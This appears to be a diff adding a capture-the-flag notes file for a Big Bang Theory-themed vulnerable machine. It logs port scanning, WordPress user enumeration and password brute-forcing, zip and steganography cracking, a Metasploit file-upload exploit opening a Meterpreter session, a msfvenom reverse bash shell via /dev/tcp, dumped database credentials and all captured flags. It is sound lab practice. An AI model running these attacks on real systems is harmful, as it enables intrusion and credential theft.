@@ -1,0 +1,228 @@
+hack@kali:~/CTF/TBBT:FunWithFlags$ cat notes.txt 
+hack@kali:~$ nmap -A -p- 192.168.1.105
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 23:35 CEST
+Nmap scan report for 192.168.1.105
+Host is up (0.0011s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp           539 Mar 04 01:11 Welcome.txt
+| -rw-r--r--    1 ftp      ftp           114 Mar 04 01:13 ftp_agreement.txt
+|_drwxr-xr-x    9 ftp      ftp          4096 Mar 04 01:09 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.1.72
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)
+|   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)
+|_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 4 disallowed entries 
+|_/howard /web_shell.php /backdoor /rootflag.txt
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Fun with flags!
+1337/tcp open  waste?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}                                               
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                          
+SF-Port1337-TCP:V=7.80%I=7%D=3/29%Time=5E8114BC%P=x86_64-pc-linux-gnu%r(NU                         
+SF:LL,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GenericLine                         
+SF:s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GetRequest,2                         
+SF:F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(HTTPOptions,2F,                         
+SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RTSPRequest,2F,"F                         
+SF:LAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RPCCheck,2F,"FLAG-s                         
+SF:heldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSVersionBindReqTCP,2F,                         
+SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSStatusRequestT                         
+SF:CP,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Help,2F,"FL                         
+SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SSLSessionReq,2F,"FL
+SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServerCookie
+SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TLSSessionReq
+SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Kerberos,2F,"
+SF:FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SMBProgNeg,2F,"FLA
+SF:G-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(X11Probe,2F,"FLAG-she
+SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(FourOhFourRequest,2F,"FLAG
+SF:-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LPDString,2F,"FLAG-she
+SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPSearchReq,2F,"FLAG-she
+SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPBindReq,2F,"FLAG-sheld
+SF:on{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SIPOptions,2F,"FLAG-sheldon{
+SF:cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LANDesk-RC,2F,"FLAG-sheldon{cf8
+SF:8b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServer,2F,"FLAG-sheldon{cf
+SF:88b37e8cb10c4005c1f2781a069cf8}\n")%r(NCP,2F,"FLAG-sheldon{cf88b37e8cb1
+SF:0c4005c1f2781a069cf8}\n")%r(NotesRPC,2F,"FLAG-sheldon{cf88b37e8cb10c400
+SF:5c1f2781a069cf8}\n")%r(JavaRMI,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f27
+SF:81a069cf8}\n")%r(WMSRequest,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a
+SF:069cf8}\n")%r(oracle-tns,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069
+SF:cf8}\n")%r(ms-sql-s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\
+SF:n")%r(afp,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(giop
+SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.70 seconds
+
+
+
+http://192.168.1.105:1337/
+FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
+
+WPSCAN:
+[i] User(s) Identified:
+
+[+] footprintsonthemoon
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://192.168.1.105/music/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] stuart
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] kripke
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - stuart / dragon                                                                        
+Trying kripke / starwars Time: 00:00:20 <======================> (659 / 659) 100.00% Time: 00:00:20
+
+[i] Valid Combinations Found:
+ | Username: stuart, Password: dragon
+
+
+
+
+hack@kali:~/CTF/TBBT:FunWithFlags$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt super_secret_nasa_stuff_here.zip 
+
+
+PASSWORD FOUND!!!!: pw == astronaut
+
+
+msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > run
+
+[*] Started reverse TCP handler on 192.168.1.72:4444 
+[+] Our payload is at: irYHgEYowyrUkb.php. Calling payload...
+[*] Calling payload...
+[*] Meterpreter session 1 opened (192.168.1.72:4444 -> 192.168.1.105:59272) at 2020-03-30 00:03:05 +0200
+[+] Deleted irYHgEYowyrUkb.php
+
+
+Enter your password:
+P@SSw0rd123Sh3ld0n
+Login Success!
+Soon I will be adding my secrets here..
+FLAG-amy{60263777358690b90e8dbe8fea6943c9}
+
+
+
+
+hack@kali:~/CTF/TBBT:FunWithFlags$ cat .FLAG.penny.txt 
+RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=
+hack@kali:~/CTF/TBBT:FunWithFlags$ 
+hack@kali:~/CTF/TBBT:FunWithFlags$ 
+hack@kali:~/CTF/TBBT:FunWithFlags$ echo "RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=" | base64 -d
+FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
+
+
+hack@kali:~/CTF/TBBT:FunWithFlags$ msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.105 lport=1234 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 67 bytes
+0<&107-;exec 107<>/dev/tcp/192.168.1.105/1234;sh <&107 >&107 2>&107
+
+
+root@tbbt:~# cat FLAG-leonard.txt
+cat FLAG-leonard.txt
+                         ____
+                        /    \
+                       /______\
+                          ||
+           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\
+          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\
+         (_)========(_)   ||  (_)==== ===========(_)
+          I|_________|I  _||_  |___________________|
+.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Gongrats!
+You have rooted the box! Now you can sit on Sheldons spot!
+FLAG-leonard{17fc95224b65286941c54747704acd3e}
+
+I hope you liked it!
+
+
+root@tbbt:/var/www/html/private# cat db_config.php
+cat db_config.php
+<?php
+// Create connection
+$DBUSER = 'bigpharmacorp';
+$DBPASS = 'weareevil';
+
+
+
+FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
+
+
+
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'footprintsonthemoon' );
+
+/** MySQL database username */
+define( 'DB_USER', 'footprintsonthemoon' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'footprintsonthemoon1337' );
+
+</div></figure>
+<!-- /wp:core-embed/youtube -->
+
+<!-- wp:paragraph -->
+<p>FLAG-raz{40d17a74e28a62eac2df19e206f0987c}</p>
+
+FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
+
+
+
+hack@kali:~/CTF/TBBT:FunWithFlags$ /home/hack/.local/bin/stegcracker marsroversketch.jpg /usr/share/wordlists/rockyou.txt 
+StegCracker 2.0.7 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2020 - Luke Paris (Paradoxis)
+
+Counting lines in wordlist..
+Attacking file 'marsroversketch.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
+Successfully cracked file with password: iloveyoumom
+Tried 51413 passwords
+Your file has been written to: marsroversketch.jpg.out
+iloveyoumom
+
+hack@kali:~/CTF/TBBT:FunWithFlags$ steghide --extract -sf marsroversketch.jpg
+Enter passphrase: 
+wrote extracted data to "FLAG-howard.txt".
+hack@kali:~/CTF/TBBT:FunWithFlags$ cat FLAG-howard.txt 
+FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
+
+
+FLAGS:
+FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
+FLAG-amy{60263777358690b90e8dbe8fea6943c9}
+FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
+FLAG-leonard{17fc95224b65286941c54747704acd3e}
+FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
+FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
+FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
